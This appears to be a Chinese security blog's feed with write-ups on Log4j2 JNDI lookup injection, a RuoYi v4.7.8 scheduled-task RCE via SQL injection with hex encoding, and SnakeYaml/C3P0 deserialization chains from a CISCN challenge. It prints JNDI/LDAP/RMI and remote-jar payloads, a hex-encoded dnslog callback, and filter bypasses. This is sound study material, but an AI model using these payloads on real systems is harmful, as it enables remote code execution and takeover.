<span class="hljs-title class_">Log4Vul</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">food</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;taco&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;&#123;&#125; is not served&quot;</span>, food);<br>        <span class="hljs-comment">// 12:17:56.859 [main] ERROR Log4Vul - taco is not served</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;&#125;</code>起到占位符的作用，被替换为传入的参数</p><p><code>log4j</code>提供了一些<code>lookup</code>功能，可以快速打印环境变量、java版本信息、日志事件、运行容器信息等内容。</p><p>如<code>logger.error(&quot;Java version :&#123;&#125;&quot;,&quot;$&#123;java:version&#125;&quot;);</code>将打印java版本</p><p>具体可以查看[官方文档](<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4j – Log4j 2 Lookups (apache.org)</a>)</p><p>可以看到有敏感的<code>JndiLookup </code>，通过jndi来获取变量值</p><p>在<code>log4j.core.lookup</code>可以找到这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">jndiName</span> <span class="hljs-operator">=</span> convertJndiName(key);<br>    <span class="hljs-keyword">try</span> (<span class="hljs-keyword">final</span> <span class="hljs-type">JndiManager</span> <span class="hljs-variable">jndiManager</span> <span class="hljs-operator">=</span> JndiManager.getDefaultManager()) &#123;<br>        <span class="hljs-keyword">return</span> Objects.toString(jndiManager.lookup(jndiName), <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>jndiManager#lookup</code>有熟悉的<code>this.context.lookup(name);</code>，<code>context</code>默认为<code>InitialContext</code></p><p>接着看看<code>log4j</code>是怎么处理我们传入的message并转化为jndi的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">MessagePatternConverter#format<br></code></pre></td></tr></table></figure><ul><li>判断是否设置<code>noLookups</code>（后面讲防御就是把这个参数设为true）</li><li>判断是否有<code>$&#123;</code></li><li>传入<code>StrSubstitutor</code>进行<code>replace</code></li></ul><p><img src="/2024/08/08/Log4j/image-20240809190958652.png" alt="image-20240809190958652"></p><p>把<code>$&#123;xxx&#125;</code>中间的内容提取出来，传入<code>resolveVariable</code>处理，在<code>Interpolator#lookup</code>，把第一个<code>:</code>前的内容提取出来，这里就是<code>jndi</code>，在<code>strLookupMap</code>找到对应的<code>Lookup</code>类，即找到<code>JndiLookup</code>类，用这个类去<code>lookup</code>后面的部分。</p><p><img src="/2024/08/08/Log4j/image-20240809191616225.png" alt="image-20240809191616225"></p><p>上面是使用<code>logger.error()</code>触发的，日志等级默认200。</p><p>一般情况下，如<code>logger.log(Level.INFO, &quot;$&#123;jndi:ldap://127.0.0.1:8099/666&#125;&quot;);</code></p><p>会经过<code>logIfEnabled()</code>的判断。</p><p><img src="/2024/08/08/Log4j/image-20240809191642961.png" alt="image-20240809191642961"></p><p>如果日志等级的值没有小于200（值越小等级越高），就不会进入<code>logMessage</code>来打印消息：</p><p><img src="/2024/08/08/Log4j/image-20240809191719075.png" alt="image-20240809191719075"></p><p>所以只有<code>OFF(0)、FATAL(100)、ERROR(200)</code>才能利用</p><p>代码中日志等级的优先级≥默认级别才可以成功，比如Struts2的默认日志等级为Info(400)，WARN(300)、ERROR、FATAL、OFF、INFO这几个级别的日志都可能被利用。</p><p>更详细的利用过程及绕过可以看：<a href="https://su18.org/post/log4j2/">Log4j2：里程碑式的顶级供应链漏洞 | 素十八 (su18.org)</a></p><h3 id="Defend"><a href="#Defend" class="headerlink" title="Defend"></a>Defend</h3><ul><li>升级到<code>2.17.0</code>版本以上</li><li>设置<code>jvm</code>参数：<code>-Dlog4j2.formatMsgNoLookups=true</code></li><li>设置环境变量：<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code></li></ul><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/log4j2">Log4j | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ruoyi-v4.7.8-RCE分析</title>
    <link href="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>应朋友的邀约看了看CNSS的夏令营题，基本是去年招新的原题，很简单。出了一道ruoyi不是原题，版本是4.7.7，这里也是直接拿下一血，借此做一个分析。</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808010612421.png" alt="image-20240808010612421"></p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808010623193.png" alt="image-20240808010623193"></p><p>其实Ruoyi在4.7.6以前都是可以直接在定时任务打snakeyaml写内存马或者jndi，但是4.7.7后把bean能调用的一些class给ban了，而且4.7.8可以看到限制了http(s)&#x2F;ldap&#x2F;rmi的执行，其实不算是完全限制，只是在函数字符串位置限制了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>调试分析我就偷个懒，这里浅浅Copy一下~~</p><h3 id="Blacklist-Whitelist"><a href="#Blacklist-Whitelist" class="headerlink" title="Blacklist &amp; Whitelist"></a>Blacklist &amp; Whitelist</h3><p>这里其实就跟那些博客写的一样，我们需要找到一个方法能够使payload写入定时任务，这里我们找到的是sql注入的方式，用十六进制绕过限制。</p><p>4.7.6往前的RCE也很简单，直接定时任务写入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;you_url_of_jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure><p>打snakeyaml反序列化，这里一般用的是http把yaml-payload.jar挂vps上，或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>直接调用lookup打JNDI。</p><p>但是使用http这种会遇到：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012333703.png" alt="image-20240808012333703"></p><p>因为在<code>SysJobController.java</code>黑名单设置：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012423775.png" alt="image-20240808012423775"></p><p>而且设置了计划任务白名单和违规字符过滤：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012501587.png" alt="image-20240808012501587"></p><p>黑白名单在com&#x2F;ruoyi&#x2F;quartz&#x2F;controller&#x2F;SysJobController#addSave：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012607310.png" alt="image-20240808012607310"></p><p>当通过了上述条件后，则执行 com&#x2F;ruoyi&#x2F;quartz&#x2F;service&#x2F;impl&#x2F;SysJobServiceImpl#insertJob，先将定时任务写入数据库：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012656684.png" alt="image-20240808012656684"></p><p>然后创建定时任务</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012708444.png" alt="image-20240808012708444"></p><p>然后就是定时任务执行逻辑，进入 com&#x2F;ruoyi&#x2F;quartz&#x2F;util&#x2F;AbstractQuartzJob#execute</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012720314.png" alt="image-20240808012720314"></p><p>继续跟进，进入 invokeMethod 方法</p><p>getInvokeTarget：调用目标字符串，获取数据库中 invoke_target 字段</p><p>getBeanName：获取 beanName</p><p>getMethodName：获取方法名</p><p>getMethodParams：获取参数名</p><p>然后判断是不是全限定类名，若不是则从 spring <a href="https://cloud.tencent.com/product/tke?from_column=20065&from=20065">容器</a>中获取</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012736493.png" alt="image-20240808012736493"></p><p>继续跟进 invokeMethod 方法，利用反射执行方法<img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012748530.png" alt="image-20240808012748530"></p><p>从上可分析出如下结果：</p><ol><li>对象可以是 spring 容器中注册过的 bean，也可以指定 class 名称。</li><li>若是 spring 容器中注册过的 bean，则可直接从 spring 容器中取出，若是指定 class 名称，则可以通过反射 newInstance()创建对象。</li></ol><p>前面也讲到了用SQL注入来绕黑白名单，接下来就介绍这一部分。</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>在 ruoyi 4.7.5 版本之前，后台接口<code>/tool/gen/createTable</code>处存在 sql 注入(CVE-2022-4566)</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012933725.png" alt="image-20240808012933725"></p><p>而 genTableService 的实现类是 GenTableServiceImpl:</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013002895.png" alt="image-20240808013002895"></p><p>对应的 Mapper 语句:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;update id=<span class="hljs-string">&quot;createTable&quot;</span>&gt;<br>       $&#123;sql&#125;<br>&lt;/update&gt;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013034355.png" alt="image-20240808013034355"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><strong>RCE</strong></h3><p>根据上文可知，ruoyi 计划任务能调用 bean 或者 class 类，SQL 注入依赖于 GenTableServiceImpl#createTable。</p><p>如果 GenTableServiceImpl 是 bean 对象，就可以直接调用 GenTableServiceImpl#createTable 执行 SQL 语句</p><p>在启动类中打印所有加载的 bean，其中包括 genTableServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(RuoYiApplication.class, args);<br><span class="hljs-comment">// 获取所有bean的名称</span><br>String[] beanDefinitionNames = run.getBeanDefinitionNames();<br><span class="hljs-comment">// 打印所有bean的名称</span><br><span class="hljs-keyword">for</span> (String beanDefinitionName : beanDefinitionNames) &#123;<br>    System.out.println(beanDefinitionName);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013103461.png" alt="image-20240808013103461"></p><p>于是可以调用 genTableServiceImpl.createTable 实现 sql 语句执行，所以 RCE 的思路：配合注入在 sys_job 数据表中直接插入恶意计划任务，即可不调用 addSave 方法添加计划任务内容，成功绕过黑白名单限制：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013138821.png" alt="image-20240808013138821"></p><p>而SQL语句是支持十六进制操作的，那我们就可以在添加SQL定时任务时，使用十六进制转换绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target =</span><br><span class="hljs-string">0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f797670307a662e646e736c6f672e636e2729 WHERE job_id = 100;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>成功调用 genTableServiceImpl.createTable 方法：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013251023.png" alt="image-20240808013251023"></p><p>成功修改：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013336825.png" alt="image-20240808013336825"></p><p>执行代码：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013347219.png" alt="image-20240808013347219"></p><p>如此这般，所有的都拉通了。</p><p>既然这里可以十六进制绕过，那么无论是打Snakeyaml的反序列化还是JNDI都是为所欲为。</p><h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p>因为题目用的公共环境，我也不想别人蹭车（嘻嘻），所以就没打内存马，直接JNDI反弹shell打的：</p><p>首先是这个方法测了一下DNS：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013647155.png" alt="image-20240808013647155"></p><p>收到回显，那么直接游戏结束了。</p><p>首先我创了几个任务，那个cront语句仿照那个随便写写就可以了，对上id，</p><p>JNDI原始payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xxxxxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>转十六进制后写入一个新创的定时任务（这里我是写入id&#x3D;7的定时任务里）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a61xxxxx.... WHERE job_id = 7;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后在表盘打开任务状态，在更多操作处选择执行一次，会发现id&#x3D;7的定时任务已经写入payload：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014026384.png" alt="image-20240808014026384"></p><p>然后在将id&#x3D;7的定时任务执行一次，JNDI反弹shell：</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014129907.png" alt="image-20240808014129907"></p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014116572.png" alt="image-20240808014116572"></p><p>参考：</p><p><a href="https://blog.csdn.net/qq_45813980/article/details/139775272">若依4.7.8版本计划任务rce复现_若依计划任务rce-CSDN博客</a></p><p><a href="https://cloud.tencent.com/developer/article/2422994">RuoYi 4.7.8 执行任意SQL语句导致RCE漏洞-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/2399994">N&#x2F;A｜RuoYi v4.7.8若依后台管理系统RCE漏洞（POC）-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://xz.aliyun.com/t/13958?time__1311=GqmxnD2DyGo05DKy+DIx4fx4R2n27T4D#toc-1">最新Ruoyi组合拳RCE分析 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/weixin_45055749/article/details/139200634">ruoyi漏洞poc汇总及其原理分析（源码分析）-CSDN博客</a></p><p><a href="https://github.com/lz2y/yaml-payload-for-ruoyi">lz2y&#x2F;yaml-payload-for-ruoyi: A memory shell for ruoyi (github.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从CISCN2023-华北-normal_snake看Snakeyaml和C3P0缝合</title>
    <link href="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/"/>
    <url>/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看标题就知道这次我要写什么，就是缝合怪。</p><p>除了Hessian这种独特的反序列化机制，以及AliyunChain17这种，很多java反序列化题目都是缝合。再加上搞心态的黑名单，缝合属性大爆发了属于是。</p><p>话不多说直接看题。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这道题我在博客园发过一次分析，这里也就浅浅贴个链接CV几下偷个懒~~</p><p>[<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18160178">CISCN 2023 华北]-normal_snake - Eddie_Murphy - 博客园 (cnblogs.com)</a></p><p>&#x2F;read路由下传参data，pyload不能包含!!，然后用了yaml来load传入的参数。</p><p>稍作了解，这其实就是 SnakeYaml 反序列化漏洞，禁用了 yaml 的常用头 <code>!!</code>。</p><p>前面的<code>!!</code>是用于强制类型转化，强制转换为<code>!!</code>后指定的类型，其实这个和Fastjson的<code>@type</code>有着异曲同工之妙。用于指定反序列化的全类名。</p><p>但用tag头可以绕过：<a href="https://mp.weixin.qq.com/s/2i6Q9Ob7n0cSxuj9Rob8Uw">微信公众平台 (qq.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">!&lt;tag:yaml.org,<span class="hljs-number">2002</span>:com.sun.rowset.JdbcRowSetImpl&gt;\n dataSourceName: \<span class="hljs-string">&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br><span class="hljs-string">    </span><br><span class="hljs-string">!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br></code></pre></td></tr></table></figure><p>或者这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">%TAG !      tag:yaml.org,<span class="hljs-number">2002</span>:<br>---<br>!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="hljs-string">&quot;http://b1ue.cn/&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>而 <code>SafeConstructorWithException</code> 中过滤了常见的 <code>payload</code> 关键字，HEX 编码部分禁用了 <code>BadAttributeValueExpException</code> 和 <code>HotSwappableTargetSource</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkForExceptions</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RuntimeException, RuntimeException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">upperCaseData</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.data.toUpperCase();<br>    <span class="hljs-keyword">if</span> (!upperCaseData.contains(<span class="hljs-string">&quot;JAVA&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JNDI&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JDBC&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (upperCaseData.contains(<span class="hljs-string">&quot;42616441747472696275746556616C7565457870457863657074696F6E&quot;</span>) || upperCaseData.contains(<span class="hljs-string">&quot;486F74537761707061626C65546172676574536F75726365&quot;</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;No way to pass!&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Unsafe data detected!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下pom.xml：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805005147709.png" alt="image-20240805005147709"></p><p>给了c3p0依赖，估计是从这里入手：</p><p>在C3P0中有三种利用方式:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">http <span class="hljs-keyword">base</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JNDI</span><br><span class="hljs-keyword"></span>HEX序列化字节加载器<br></code></pre></td></tr></table></figure><p>在原生的反序列化中如果找不到其他链，则可尝试C3P0去加载远程的类进行命令执行。JNDI则适用于Jackson等利用。而HEX序列化字节加载器的方式可以利用与fj和Jackson等不出网情况下打入内存马使用。</p><p>抄一下：</p><p><a href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 华北分区赛 normal_snake - B0T1eR - 博客园 (cnblogs.com)</a></p><p>C3P0 主要有以下利用链：</p><table><thead><tr><th align="left">触发点</th><th align="left">功效</th><th align="left">适用性</th></tr></thead><tbody><tr><td align="left">JndiRefForwardingDataSource#setLoginTimeout – InitialContext#lookup</td><td align="left">Jndi 注入</td><td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td></tr><tr><td align="left">WrapperConnectionPoolDataSource#setUserOverridesAsString – ObjectInputStream#readObject</td><td align="left">Hex 解码后触发原生反序列化</td><td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject – IndirectlySerialized#getObject() – InitialContext#lookup</td><td align="left">Jndi 注入</td><td align="left">Java原生反序列化</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject – IndirectlySerialized#getObject() – com.mchange.v2.naming.ReferenceableUtils#referenceToObject – URLClassLoader</td><td align="left">URLCLassLoader 远程类加载</td><td align="left">Java原生反序列化</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject – IndirectlySerialized#getObject() – com.mchange.v2.naming.ReferenceableUtils#referenceToObject – BeanFactory#getInstance</td><td align="left">不出网的命令注入</td><td align="left">Java原生反序列化不出网</td></tr></tbody></table><p>在不考虑题目黑名单的情况下，这里浅浅了解了一下C3P0的几种打法：</p><h3 id="JndiRefForwardingDataSource：Jndi-注入"><a href="#JndiRefForwardingDataSource：Jndi-注入" class="headerlink" title="JndiRefForwardingDataSource：Jndi 注入"></a>JndiRefForwardingDataSource：Jndi 注入</h3><p>没错，又是老常客了，JNDI注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds) 可以触发 jndi 注入<br></code></pre></td></tr></table></figure><p>poc链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout(<span class="hljs-type">int</span> seconds)<br> -com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner()<br>   -com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference()<br>     -InitialContext#lookup()<br></code></pre></td></tr></table></figure><p>而SnakeYaml 可以触发该 setter 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc_snakeyaml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n jndiName: \&quot;rmi://127.0.0.1:1234/Exploit\&quot;\n loginTimeout: 0&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="WrapperConnectionPoolDataSource：Hex-二次反序列化"><a href="#WrapperConnectionPoolDataSource：Hex-二次反序列化" class="headerlink" title="WrapperConnectionPoolDataSource：Hex 二次反序列化"></a>WrapperConnectionPoolDataSource：Hex 二次反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> +hexAscii+ <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>为什么 SnakeYaml 可以触发 Hex 二次反序列化这条链子？</p><p>首先 SnakeYaml 在反序列化的时候会根据 yaml 中的类属性描述进行相关 setter 方法并调用：</p><p>WrapperConnectionPoolDataSourceBase 是 WrapperConnectionPoolDataSource的父类，而<code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code>在 snakeyaml 反序列化的时候会被调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserOverridesAsString</span><span class="hljs-params">( String userOverridesAsString )</span> <span class="hljs-keyword">throws</span> PropertyVetoException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">oldVal</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userOverridesAsString;<br>    <span class="hljs-keyword">if</span> ( ! eqOrBothNull( oldVal, userOverridesAsString ) )<br>        vcs.fireVetoableChange( <span class="hljs-string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString );<br>    <span class="hljs-built_in">this</span>.userOverridesAsString = userOverridesAsString;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过一系列调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.beans.VetoableChangeSupport#fireVetoableChange(String propertyName, Object oldValue, Object newValue)<br>    -java.beans.VetoableChangeSupport#fireVetoableChange(PropertyChangeEvent event)<br>      -java.beans.VetoableChangeListener#vetoableChange()<br>        -C3P0ImplUtils#parseUserOverridesAsString()<br>          -com.mchange.v2.ser.SerializableUtils#fromByteArray(<span class="hljs-type">byte</span>[] bytes)<br>            -com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(<span class="hljs-type">byte</span>[] bytes)<br></code></pre></td></tr></table></figure><p><code>C3P0ImplUtils#parseUserOverridesAsString</code>方法：从形参处截取掉HASM_HEADER：<code>HexAsciiSerializedMap</code>字符串然后进行hex解码为字节数组：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010542985.png" alt="image-20240805010542985"></p><p>下一个栈调用<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray(byte[] bytes)</code>处理字节数组调用原生反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeFromByteArray</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span 